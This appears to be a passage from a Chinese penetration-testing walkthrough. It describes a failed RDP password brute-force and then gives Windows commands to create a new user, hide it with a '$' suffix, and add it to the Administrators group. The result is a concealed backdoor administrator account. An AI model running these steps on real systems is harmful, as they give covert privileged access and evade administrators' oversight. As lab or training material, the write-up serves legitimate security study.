<h1 data-id="heading-0">远程登录</h1>
<p>知道了用户administrator的存在，进行3389端口的远程登录口令暴破，失败告终。</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/b0de60ef5d1b43049335bf4bebdeb303~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy" referrerpolicy="no-referrer"></p>
<p>利用前面我们都拿到的shell，可以创建一个用户进行远程登录嘛</p>
<h1 data-id="heading-1">创建用户</h1>
<p>net user username password /add</p>
<p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/a2e338047fc946129bccc5e21acd3a03~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy" referrerpolicy="no-referrer"></p>
<p>ps：在用户名后面加上”$”后在命令行使用net user查看所有用户时会隐藏该用户。 将创建的用户加入管理员组 net localgroup Administrators username /add</p>
<p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/8d24ae91766c4a43b2f83789fa7c86c7~tplv-k3u1fbpfcp-watermark.image" alt="image.png" loading="lazy" referrerpolicy="no-referrer"></p>
